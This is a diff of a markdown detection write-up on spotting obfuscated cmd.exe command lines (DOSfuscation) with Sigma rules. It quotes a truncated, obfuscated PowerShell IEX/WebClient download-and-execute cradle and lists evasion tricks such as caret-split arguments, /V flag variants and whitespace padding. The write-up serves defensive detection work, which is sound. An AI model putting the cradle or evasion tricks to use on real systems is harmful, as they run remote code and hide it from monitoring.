@@ -64,6 +64,7 @@ cmd.exe /c “Powe%ALLUSERSPROFILE:~4,1%Shell.exe IEX (New-Object Net.WebClient)
 ![binex 3](https://i.ibb.co/HK50bQW/image.png)
 
 ### ENCODING
+Substrings of existing environment variables can be used to encode entire batch file contents or select portions of commands. The payload encoding techniques in these samples only affect static detections because these encodings do not remain in the dynamic execution of external commands in the batch files.
 
 ### PAYLOAD
 As pointed by the author (Daniel Bohannon (@danielhbohannon)) himself, there are numerous building blocks that must be combined to perform the advanced payload encoding techniques. Searching for these building blocks in process arguments, common persistence locations and in file repositories is a good first step in reducing the data set when building robust detections for DOSfuscation in general. We're going to use Sigma so we'll be looking for those building blocks in command-line events (WEL Security Event ID 4688 and Sysmon Event ID 1).
@@ -98,7 +99,6 @@ Some basic building block concepts for each of the advanced encoding techniques 
    ```
 The above building block suggestions are extremely basic and should merely serve as a starting point for detection development. However, this should begin reducing the amount of data returned from initial searches. In the case of small environments there may not be much noise at all to filter out. However, in other environments there might be one of many enterprise applications that legitimately uses for loops, variable substrings and concatenated strings on the command line in high quantities. In these environments multiple iterations and layers of detection tuning may be required.
 
-
 Another example is CMD argument obfuscation. An obvious first choice would be anchoring these detections on process executions with arguments containing ```/C```, but there are numerous pitfalls to consider if using this approach:
 * Whitespace is not required before or after the ```/C``` argument: ```cmd/Ccalc```
 * Caret characters can break up the argument: ```cmd^/^C^calc```
@@ -109,7 +109,6 @@ Another anchor character term in many of the payload encoding techniques is the 
 * Caret characters can break up the argument: ```cmd^/^V^:^O^N^/Ccalc```   
 * ```/V:ON``` can also be written as ```/V:O```, ```/V:```, ```/V```, and (barring some minor syntax exceptions and the ```/V:OFF``` argument) any combination of characters after ```/V``` including ```/VeryObfuscated```, ```/VivaLaVida```, ```/V_--_==```, etc.
 * It is also worth noting that in the context of cmd.exe’s arguments, ```\C``` means nothing if appearing before ```/C```. An example intended to throw off visual inspection of command line arguments would be ```cmd.exe \C echo %PATH%``` <100’s of whitespace characters> ```/C netstat /ano``` where everything before ```/C``` is ignored.
-
 
 Considering all this we developed a table with pre-generated CMD commands, obfuscated by the [Invoke-DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) framework, to achieve our main goal to detect the obfuscation method looking for similar patterns in all of it obfuscation examples.
 
